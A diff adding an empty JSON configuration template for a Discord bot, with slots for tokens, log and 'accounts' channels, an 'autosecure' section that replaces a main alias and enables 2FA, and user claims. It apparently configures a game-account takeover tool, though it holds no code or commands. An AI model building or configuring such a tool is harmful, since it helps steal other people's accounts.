@@ -1,0 +1,28 @@
+{
+  "owners": [],
+  "tokens": {
+    "bot_token": "",
+    "skytools_key": "",
+    "donut_key": ""
+  },
+  "discord": {
+    "logs_channel": "",
+    "accounts_channel": "",
+    "censored_logs_channel": ""
+  },
+  "autosecure": {
+    "replace_main_alias": false,
+    "enable_2fa": false
+  },
+  "claims": {
+    "claims_enabled": false,
+    "claim_users": []
+  },
+  "web": {
+    "credentials": {
+      "username": "",
+      "password_hash": ""
+    }
+  },
+  "domain": ""
+}
